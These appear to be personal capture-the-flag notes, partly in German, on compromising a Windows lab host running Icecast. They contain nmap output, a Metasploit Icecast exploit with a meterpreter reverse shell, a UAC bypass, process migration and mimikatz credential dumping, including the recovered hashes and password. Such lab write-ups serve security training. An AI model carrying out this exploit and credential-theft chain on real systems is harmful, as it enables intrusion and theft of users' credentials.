# Basic Pentesting

IP = 10.10.90.191

# Scanning

in der Sessionn:

getuid

sysinfo

ps

nach exploits suchen: 
run post/multi/recon/local_exploit_suggester

use exploit/windows/local/bypassuac_eventvwr

ip addr

set lhost

run

in shell: 
getprivs

ps

migrate -N spoolsv.exe

getuid

load kiwi

for kiwi commannds: 
help

creds_all

### Hostname:

DARK-PC

### OS:

Windows

### Users / Passwords:

Dark      Dark-PC    Password01!

### Ports:

    [*] Nmap: 135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
    [*] Nmap: 445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    [*] Nmap: 3389/tcp  open  ssl/ms-wbt-server? syn-ack
    [*] Nmap: 5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    [*] Nmap: 8000/tcp  open  http               syn-ack Icecast streaming media server
    [*] Nmap: 49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49160/tcp open  msrpc 

### WebServer:

### Connection:

### Vulnarbility

    10.10.90.191 - Collecting local exploits for x86/windows...
    [*] 10.10.90.191 - 34 exploit checks are being tried...
    [+] 10.10.90.191 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
    

use exploit/windows/local/bypassuac_eventvwr



### Exploration:

    msf5 exploit(windows/http/icecast_header) > search icecast
    
    Matching Modules
    ================
    
       #  Name                                 Disclosure Date  Rank   Check  Description
       -  ----                                 ---------------  ----   -----  -----------
       0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
    
    
    msf5 exploit(windows/http/icecast_header) > show options
    
    Module options (exploit/windows/http/icecast_header):
    
       Name    Current Setting  Required  Description
       ----    ---------------  --------  -----------
       RHOSTS  10.10.239.197    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT   8000             yes       The target port (TCP)
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.9.60.67       yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Automatic



# Notes:

    db_nmap -sV -vv 10.10.90.191
    
    [*] Nmap: PORT      STATE SERVICE            REASON  VERSION
    [*] Nmap: 135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
    [*] Nmap: 445/tcp   open  microsoft-ds       syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    [*] Nmap: 3389/tcp  open  ssl/ms-wbt-server? syn-ack
    [*] Nmap: 5357/tcp  open  http               syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    [*] Nmap: 8000/tcp  open  http               syn-ack Icecast streaming media server
    [*] Nmap: 49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49158/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49159/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: 49160/tcp open  msrpc              syn-ack Microsoft Windows RPC
    [*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

----

    meterpreter > run post/multi/recon/local_exploit_suggester
    
    [*] 10.10.90.191 - Collecting local exploits for x86/windows...
    [*] 10.10.90.191 - 34 exploit checks are being tried...
    [+] 10.10.90.191 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
    [+] 10.10.90.191 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.


    msf5 exploit(windows/local/bypassuac_eventvwr) > show options
    
    Module options (exploit/windows/local/bypassuac_eventvwr):
    __
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION                   yes       The session to run this module on.
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows x86
    
    
    msf5 exploit(windows/local/bypassuac_eventvwr) > set session 3
    session => 3

----

    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRemoteShutdownPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege

---

    meterpreter > ps
    
    Process List
    ============
    
     PID   PPID  Name                  Arch  Session  User                          Path
     ---   ----  ----                  ----  -------  ----                          ----
     0     0     [System Process]                                                   
     4     0     System                x64   0                                      
     140   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
     416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
     544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
     584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
     592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
     604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
     652   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
     692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
     700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
     708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
     816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
     884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
     932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
     996   692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
     1020  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
     1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
     1140  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
     1264  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
     1328  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
     1416  692   taskhost.exe          x64   1        Dark-PC\Dark                  C:\Windows\System32\taskhost.exe
     1564  1020  dwm.exe               x64   1        Dark-PC\Dark                  C:\Windows\System32\dwm.exe
     1576  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
     1592  1532  explorer.exe          x64   1        Dark-PC\Dark                  C:\Windows\explorer.exe
     1640  816   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
     1688  2300  cmd.exe               x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\cmd.exe
     1708  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
     1748  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
     1908  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
     2120  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
     2196  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
     2300  1592  Icecast2.exe          x86   1        Dark-PC\Dark                  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
     2552  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
     2628  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
     2840  604   conhost.exe           x64   1        Dark-PC\Dark                  C:\Windows\System32\conhost.exe
     3008  368   powershell.exe        x86   1        Dark-PC\Dark                  C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe

---

    meterpreter > load kiwi
    Loading extension kiwi...
      .#####.   mimikatz 2.2.0 20191125 (x64/windows)
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
     '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
      '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
    Success.

--- 

    meterpreter > creds_all
    [+] Running as SYSTEM
    [*] Retrieving all credentials
    msv credentials
    ===============
    
    Username  Domain   LM                                NTLM                              SHA1
    --------  ------   --                                ----                              ----
    Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb
    
    wdigest credentials
    ===================
    
    Username  Domain     Password
    --------  ------     --------
    (null)    (null)     (null)
    DARK-PC$  WORKGROUP  (null)
    Dark      Dark-PC    Password01!
    
    tspkg credentials
    =================
    
    Username  Domain   Password
    --------  ------   --------
    Dark      Dark-PC  Password01!
    
    kerberos credentials
    ====================
    
    Username  Domain     Password
    --------  ------     --------
    (null)    (null)     (null)
    Dark      Dark-PC    Password01!
    dark-pc$  WORKGROUP  (null)
